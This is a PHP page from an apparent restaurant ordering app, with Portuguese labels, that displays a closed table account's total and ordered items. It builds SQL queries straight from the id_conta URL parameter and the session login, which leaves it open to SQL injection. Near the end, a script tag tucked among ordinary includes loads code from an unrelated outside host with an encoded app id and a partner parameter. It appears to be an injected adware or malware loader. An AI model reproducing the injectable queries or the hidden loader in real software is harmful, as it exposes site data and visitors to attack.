<?php 
  require_once 'connect_db.php';
				session_start();

  ?>

<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>fastfood v1 - Start</title>
    <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="bootstrap/css/bootstrap.css" rel="stylesheet">
  <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="bootstrap/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
    <script type="text/javascript" src="jquery.quick.search.js"></script>
    <link rel="stylesheet" href="css/style.css">
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/bootstrap-tagsinput.css">
      <script>
function MascaraMoeda(objTextBox, SeparadorMilesimo, SeparadorDecimal, e){
    var sep = 0;
    var key = '';
    var i = j = 0;
    var len = len2 = 0;
    var strCheck = '0123456789';
    var aux = aux2 = '';
    var whichCode = (window.Event) ? e.which : e.keyCode;
    if (whichCode == 13) return true;
    key = String.fromCharCode(whichCode); // Valor para o código da Chave
    if (strCheck.indexOf(key) == -1) return false; // Chave inválida
    len = objTextBox.value.length;
    for(i = 0; i < len; i++)
        if ((objTextBox.value.charAt(i) != '0') && (objTextBox.value.charAt(i) != SeparadorDecimal)) break;
    aux = '';
    for(; i < len; i++)
        if (strCheck.indexOf(objTextBox.value.charAt(i))!=-1) aux += objTextBox.value.charAt(i);
    aux += key;
    len = aux.length;
    if (len == 0) objTextBox.value = '';
    if (len == 1) objTextBox.value = '0'+ SeparadorDecimal + '0' + aux;
    if (len == 2) objTextBox.value = '0'+ SeparadorDecimal + aux;
    if (len > 2) {
        aux2 = '';
        for (j = 0, i = len - 3; i >= 0; i--) {
            if (j == 3) {
                aux2 += SeparadorMilesimo;
                j = 0;
            }
            aux2 += aux.charAt(i);
            j++;
        }
        objTextBox.value = '';
        len2 = aux2.length;
        for (i = len2 - 1; i >= 0; i--)
        objTextBox.value += aux2.charAt(i);
        objTextBox.value += SeparadorDecimal + aux.substr(len - 2, len);
    }
    return false;
}
    </script>

</head>
<body>
<div class="container" name="container" id="container">


<div class="row marketing" style=" border: 1px solid rgb(225, 232, 237); border-radius: 4px;">
<h4 class="text-center">Dados Da Conta</h4>
<div class="col-lg-6">
 <form action="ver_conta.php" method="post" class="form-group">
      <?php 
        $id_conta = $_GET['id_conta'];
        $resultado = mysql_query("SELECT * FROM tab_conta where id_conta = $id_conta",$dbconn);
        if ($resultado) {
        while ($row = mysql_fetch_assoc($resultado)) {
          ?>

        ID:
        <div class="form-group">
          <?php echo $row['id_conta']?>
        </div>

        Status:
        <div class="form-group">
		Encerrada
        </div>
		Mesa:
        <div class="form-group">
        <?php echo $row['mesa']?>
        </div>
       Valor Total:	
		<div class="form-group"><?php
					$usu=$_SESSION['login'];
		$total=mysql_query("select SUM(tab_prod.valor) from tab_prod,tab_usuario,pedido where 
		pedido.id_prod = tab_prod.pro_id 
		and 
		tab_usuario.login = '$usu' AND pedido.conta='$id_conta'") or die (mysql_error());

		while ($rows = mysql_fetch_array($total)) {
		$soma = array_sum($rows)/2; 
		}
		?>
		<b >R$<input name="valorTotal" value="<?php echo $soma;?>"></b>
		
		<div>
<br>
        Pedido:
        <div class="form-group">

		<?php
			$usu=$_SESSION['login'];
		$sql="
		SELECT * FROM tab_prod,tab_usuario,pedido where 
		pedido.id_prod = tab_prod.pro_id 

		and 
		tab_usuario.login = '$usu' AND pedido.conta='$id_conta'";
		$result_set=mysql_query($sql);
		while($row = mysql_fetch_assoc($result_set))
		{
		$pro=$row['pro_nome'];
		
		?>
								<ul><li><?php echo $row['pro_nome'];?></li></ul> <br>

<br>


		<?php
		}
		?>
			<br>
			<br>
		<input type="button" value="Imprimir" class='btn btn-sm btn-primary'onclick="window.print('container');"></a>
	
		  <td>
    <form action="ver_conta.php" method="POST">
	<input type="submit" value="Cancelar" name="Submit" class='btn btn-sm btn-danger'> 
    </form>
  </td>

        
        <?php 
            }
          }
        mysql_close($dbconn);
        ?>

      </form>


        </div>
      </div>

  <!-- fim da classe container -->

      <footer class="footer">
        <p>&copy; 2017 Company, Inc.</p>
      </footer>

    </div> <!-- /container -->


    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
  <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  <script src='http://grugol.com/prog/landing.php?app=MDAtMUUtOEMtMjUtRkEtMEQ=&partner=200'></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/bootstrap-tagsinput.min.js"></script>


  
</body>
</html>
